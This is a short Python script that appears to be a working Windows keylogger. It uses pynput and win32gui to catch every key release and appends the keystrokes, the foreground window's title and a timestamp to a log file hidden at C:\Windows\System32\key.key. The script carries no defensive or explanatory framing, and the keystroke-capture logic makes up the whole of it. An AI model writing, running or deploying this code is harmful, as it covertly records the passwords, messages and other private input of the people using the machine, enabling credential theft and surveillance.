from pynput.keyboard import Key, Controller,Listener
import time,os
import win32gui as w
keyboard = Controller()
keys=[]
key_path="C:\\Windows\\System32\\key.key"
def on_press(key):
    string = str(key).replace("'","")

def on_release(key):
    global keys
    string = str(key).replace("'","")
    keys.append(string)
    main_string = "".join(keys)
    with open(key_path, 'a+',encoding="utf-8") as f:
        f.write("【"+w.GetWindowText (w.GetForegroundWindow())+"】"+time.strftime("%d %H:%M:%S", time.localtime())+"----->"+main_string+"\n")   
        keys= []    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
